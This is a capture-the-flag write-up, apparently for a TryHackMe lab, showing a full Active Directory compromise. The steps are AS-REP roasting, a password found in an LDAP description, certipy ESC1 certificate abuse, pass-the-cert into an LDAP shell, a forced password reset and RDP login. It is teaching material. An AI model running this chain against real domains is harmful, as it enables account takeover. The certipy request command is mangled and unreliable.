# Ledger

## Machine Info

Domain name: `THM.local`

FQDN: `labyrinth.thm.local`&#x20;

Dinaub SID: `S-1-5-21-1966530601-3185510712-10604624`





## Ports Scan

```bash
nmap -T4 -A -p- --min-rate 1000 10.10.242.176 -oN port_scan.txt

Nmap scan report for 10.10.242.176
Host is up (0.043s latency).
Not shown: 65505 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-29 07:27:05Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: thm.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:labyrinth.thm.local, DNS:thm.local, DNS:THM
| Not valid before: 2023-05-12T07:32:36
|_Not valid after:  2024-05-11T07:32:36
|_ssl-date: 2025-07-29T07:28:13+00:00; -2s from scanner time.
443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
| tls-alpn: 
|_  http/1.1
| http-methods: 
|_  Potentially risky methods: TRACE
|_ssl-date: 2025-07-29T07:28:13+00:00; -1s from scanner time.
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
| ssl-cert: Subject: commonName=thm-LABYRINTH-CA
| Not valid before: 2023-05-12T07:26:00
|_Not valid after:  2028-05-12T07:35:59
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:labyrinth.thm.local, DNS:thm.local, DNS:THM
| Not valid before: 2023-05-12T07:32:36
|_Not valid after:  2024-05-11T07:32:36
|_ssl-date: 2025-07-29T07:28:13+00:00; -1s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: thm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2025-07-29T07:28:13+00:00; -2s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:labyrinth.thm.local, DNS:thm.local, DNS:THM
| Not valid before: 2023-05-12T07:32:36
|_Not valid after:  2024-05-11T07:32:36
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: thm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2025-07-29T07:28:13+00:00; -1s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:labyrinth.thm.local, DNS:thm.local, DNS:THM
| Not valid before: 2023-05-12T07:32:36
|_Not valid after:  2024-05-11T07:32:36
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=labyrinth.thm.local
| Not valid before: 2025-07-28T07:22:51
|_Not valid after:  2026-01-27T07:22:51
|_ssl-date: 2025-07-29T07:28:13+00:00; -1s from scanner time.
7680/tcp  open  pando-pub?
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49683/tcp open  msrpc         Microsoft Windows RPC
49703/tcp open  msrpc         Microsoft Windows RPC
49713/tcp open  msrpc         Microsoft Windows RPC
49715/tcp open  msrpc         Microsoft Windows RPC

```



## LDAP Enum

With this nmap command we can notice that we anonymous ldap is enabled, and we can use this flaw to enum the Domain.

```bash
nmap -p 389 --script ldap-search 10.10.242.176
```



### AS-REP Roastable user

Now, with impacket we can enumerate the user with "**Do not require Kerberos preauthentication**" parameter to enable.

```bash
impacket-GetNPUsers THM.local/ -dc-ip 10.10.242.176

Name            MemberOf  PasswordLastSet             LastLogon  UAC      
--------------  --------  --------------------------  ---------  --------
SHELLEY_BEARD             2023-05-30 11:46:05.083950  <never>    0x410200 
ISIAH_WALKER              2023-05-30 11:46:09.380690  <never>    0x410200 
QUEEN_GARNER              2023-05-30 11:46:14.208632  <never>    0x410200 
PHYLLIS_MCCOY             2023-05-30 11:46:20.583409  <never>    0x410200 
MAXINE_FREEMAN            2023-05-30 11:46:51.475615  <never>    0x410200 
```

Request the tgt ticket for all user above.

```bash
impacket-GetNPUsers THM.local/SHELLEY_BEARD -dc-ip 10.10.242.176 -no-pass
impacket-GetNPUsers THM.local/ISIAH_WALKER -dc-ip 10.10.242.176 -no-pass
impacket-GetNPUsers THM.local/QUEEN_GARNER -dc-ip 10.10.242.176 -no-pass
impacket-GetNPUsers THM.local/PHYLLIS_MCCOY -dc-ip 10.10.242.176 -no-pass
impacket-GetNPUsers THM.local/MAXINE_FREEMAN -dc-ip 10.10.242.176 -no-pass
```

Copy all results in a file and try to crack at least one.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt tgts_ticket.txt
```

Nothing results :(



### AD Object description

Check if there are some passwords in the user's AD description

{% code overflow="wrap" %}
```bash
ldapsearch -x -H ldap://thm.local -b "dc=thm,dc=local" "(objectClass=user)" cn description

[..snip..]
# SUSANNA_MCKNIGHT, Test, ITS, Tier 1, thm.local
dn: CN=SUSANNA_MCKNIGHT,OU=Test,OU=ITS,OU=Tier 1,DC=thm,DC=local
cn: SUSANNA_MCKNIGHT
description: Please change it: CHANGEME2023!
[..snip..]
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (331).png" alt=""><figcaption></figcaption></figure>

We found a possible password for the SUSANNA\_MCKNIGHT user. Using cme check if the password is still valid.

```bash
crackmapexec smb 10.10.242.176 -u 'SUSANNA_MCKNIGHT' -p 'CHANGEME2023!'
```

<figure><img src="../../../.gitbook/assets/image (332).png" alt=""><figcaption></figcaption></figure>

It's still vaild.



## Bloodhound enumeration

With the credentials found, enumerate the Domain with bloodhound

{% code overflow="wrap" %}
```bash
bloodhound-python -c all -ns 10.10.242.176 -dc labyrinth.thm.local -d thm.local --zip -u 'SUSANNA_MCKNIGHT' -p 'CHANGEME2023!'
```
{% endcode %}

The bloodhound research didn't find out interesting things to escalate our priviliges



## AD CS finding

Try to find out some Certs misconfiguration .

{% code overflow="wrap" %}
```bash
certipy find -u 'SUSANNA_MCKNIGHT' -p 'CHANGEME2023!' -dc-ip 10.10.242.176 -vulnerable -enabled

cat *_Certipy.txt | grep ESC
```
{% endcode %}

From this output we can see that the CA:

```
Certificate Authorities             : thm-LABYRINTH-CA
```

It's vulnerable to ESC1.

```
ESC1        : Enrollee supplies subject and template allows client authentication.
```

### ESC1 flaw

Using this flaw we can request a certificate for any user in the Domain.&#x20;

{% code overflow="wrap" %}
```bash
certipy req -ca 'thm-LABYRINTH-CA' -dc-ip '10.10.242.176' -u 'SUSANNA_MCKNIGHT' -p certipy req -u "SUSANNA_MCKNIGHT@thm.local" -p 'CHANGEME2023!' -dc-ip '10.10.102.159' -target "labyrinth.thm.local" -ca 'thm-LABYRINTH-CA' -template 'ServerAuth' -upn 'administrator@thm.local'
```
{% endcode %}

Now the certificate is broken and when i try to request the TGT, it generates a PADATA error because the certificate is expired.

The solution is extract the .key and .crt from the pfx and login with Pass-the-cert python tool.

{% code overflow="wrap" %}
```bash
certipy cert -pfx administrator.pfx -nokey -out "administrator.crt"
certipy cert -pfx administrator.pfx -nocert -out "administrator.key"

python3 passthecert.py -action ldap-shell -crt ../../administrator.crt  -key ../../administrator.key -domain thm.local -dc-ip 10.10.102.159
```
{% endcode %}

Now that we have a LDAP-SHELL we can use the function `change_password` to change the administrator  user password and access to the system as administrator.

```bash
change_password BRADLEY_ORTIZ Password123!
```

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## RDP as administrator user

```bash
xfreerdp3 /v:10.10.102.159 /u:BRADLEY_ORTIZ /p:Password123!
```

Run as Powershell as administrator and print the user and root flag.

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
